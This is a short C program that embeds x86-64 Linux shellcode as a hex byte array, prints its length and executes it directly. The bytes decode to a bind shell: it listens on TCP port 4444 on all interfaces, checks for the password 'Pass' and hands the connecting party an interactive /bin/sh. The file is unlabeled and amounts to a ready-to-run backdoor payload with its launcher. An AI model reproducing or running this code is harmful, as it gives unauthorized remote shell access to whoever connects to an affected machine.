#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x0f"
"\x05\x48\x97\x48\x31\xc0\x50\x48\xc7\xc3\xfd\xff\xee"
"\xa3\x48\xf7\xd3\x53\x54\x6a\x31\x58\x5e\x6a\x10\x5a"
"\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58"
"\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x49"
"\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6"
"\x6a\x21\x58\x0f\x05\x48\xff\xc6\x48\x83\xfe\x03\xe0"
"\xf2\x48\x31\xc0\x6a\x08\x5a\x48\x83\xec\x08\x54\x5e"
"\x31\xff\x0f\x05\x68\x50\x61\x73\x73\x58\x48\x8d\x3e"
"\xaf\x74\x05\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7"
"\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
"\x53\x54\x5f\x6a\x3b\x58\x0f\x05";


main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	(*(void  (*)()) code)();;

}

